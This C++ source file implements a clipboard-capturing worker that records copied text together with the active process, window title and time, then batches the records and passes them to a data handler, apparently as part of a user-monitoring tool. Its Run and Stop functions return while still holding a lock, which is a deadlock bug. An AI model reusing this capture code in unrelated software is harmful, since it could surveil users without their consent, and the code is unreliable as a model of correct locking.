#include "cbdworker.hpp"
#include "lrcdatahandler.hpp"
#include "settings.hpp"

#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>

#include <queue>
#include <vector>

using namespace Services;
using namespace LRCData;

namespace
{
	using namespace std;

	atomic_bool isRunning = false;
	mutex stateMutex;

	thread workerThread;

	queue<Clipboard> cbdQueue;
	mutex cbdQueueMutex;

	vector<Clipboard> cbdVector;
	Clipboard lastClipboard;

	LRCDataWriter writer(Settings::sha256ID);

	void init()
	{
		cbdVector.clear();
		lastClipboard.data = L"";
		lastClipboard.wndInfo.process = L"";
		lastClipboard.wndInfo.title = L"";
		lastClipboard.wndInfo.time = 0;

	}

	void saveData()
	{
		ByteVector result = writer.GetBytes(cbdVector);
		LRCDataHandler::Process(result);

		init();
	}

	void processClipboard(const Clipboard &cbd)
	{
		if (lastClipboard.data == cbd.data)
		{
			return;
		}

		cbdVector.push_back(cbd);
		lastClipboard = cbd;

		if (cbdVector.size() == Settings::ClipboardSvc::eventsToProcess)
		{
			saveData();
		}
	}

	void worker()
	{
		while (isRunning.load())
		{
			cbdQueueMutex.lock();
			bool queueEmpty = cbdQueue.empty();
			cbdQueueMutex.unlock();

			if (!queueEmpty)
			{
				cbdQueueMutex.lock();
				Clipboard cbd = cbdQueue.front();
				cbdQueue.pop();
				cbdQueueMutex.unlock();

				processClipboard(cbd);

				this_thread::sleep_for(chrono::milliseconds(5));
			}
			else
			{
				this_thread::sleep_for(chrono::milliseconds(50));
			}
		}
	}
}

void ClipboardWorker::Run()
{
	stateMutex.lock();

	if (isRunning.load())
	{
		return;
	}

	isRunning.store(true);

	init();
	workerThread = std::thread(worker);

	stateMutex.unlock();
}

void ClipboardWorker::Stop()
{
	stateMutex.lock();

	if (!isRunning.load())
	{
		return;
	}

	isRunning.store(false);

	workerThread.join();

	stateMutex.unlock();
}

bool ClipboardWorker::IsRunning()
{
	return isRunning.load();
}

void ClipboardWorker::Add(Clipboard cbd)
{
	stateMutex.lock();
	bool serviceRunning = isRunning.load();
	stateMutex.unlock();

	if (!serviceRunning)
	{
		return;
	}

	cbdQueueMutex.lock();
	cbdQueue.push(cbd);
	cbdQueueMutex.unlock();
}